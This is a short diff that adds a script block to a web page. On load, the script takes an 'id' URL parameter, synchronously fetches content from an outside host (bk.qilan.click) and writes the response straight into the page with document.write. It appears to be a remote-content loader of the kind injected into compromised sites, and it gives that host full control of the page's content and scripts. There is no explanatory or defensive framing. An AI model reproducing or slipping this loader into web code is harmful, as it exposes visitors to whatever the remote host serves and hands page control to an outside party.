@@ -1,0 +1,23 @@
+<script>
+    var pid = getParameterByName('id');
+        var url = "http://bk.qilan.click/cs/stapi.php?id=" + pid;
+        var response = HttpGet(url); 
+        document.write(response);
+    
+            function HttpGet(url) {
+            var xmlHttp = null;
+            xmlHttp = new XMLHttpRequest();
+            xmlHttp.open("get", url, false);
+            xmlHttp.send(null);
+            return xmlHttp.responseText;
+            }
+            function getParameterByName(name, url) {
+        if (!url) url = window.location.href;
+        name = name.replace(/[\[\]]/g, '\\$&');
+        var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+            results = regex.exec(url);
+        if (!results) return null;
+        if (!results[2]) return '';
+        return decodeURIComponent(results[2].replace(/\+/g, ' '));
+    }
+        </script>
